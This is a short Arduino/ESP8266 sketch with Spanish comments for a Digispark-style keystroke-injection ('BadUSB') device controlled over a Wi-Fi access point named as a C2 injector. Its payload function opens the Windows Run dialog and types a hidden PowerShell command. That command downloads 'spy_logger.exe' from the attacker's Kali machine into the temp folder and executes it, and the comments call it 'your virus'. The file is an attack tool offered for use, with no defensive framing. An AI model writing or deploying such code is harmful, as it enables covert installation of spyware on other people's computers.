#include <ESP8266WiFi.h>
#include "DigiKeyboard.h" // Si usas Digispark

void setup() {
  // Configuración del punto de acceso para que tú te conectes al USB
  WiFi.softAP("C2-Injector-01", "password123"); 
}

void deployPayload() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abre "Ejecutar"
  DigiKeyboard.delay(500);
  // Escribe el comando para descargar tu virus desde tu IP de Kali
  DigiKeyboard.print("powershell -WindowStyle Hidden IWR http://tu-ip-kali/spy_logger.exe -OutFile %temp%\\s.exe; Start-Process %temp%\\s.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Aquí el código esperaría una señal de tu panel web para ejecutar deployPayload()
}
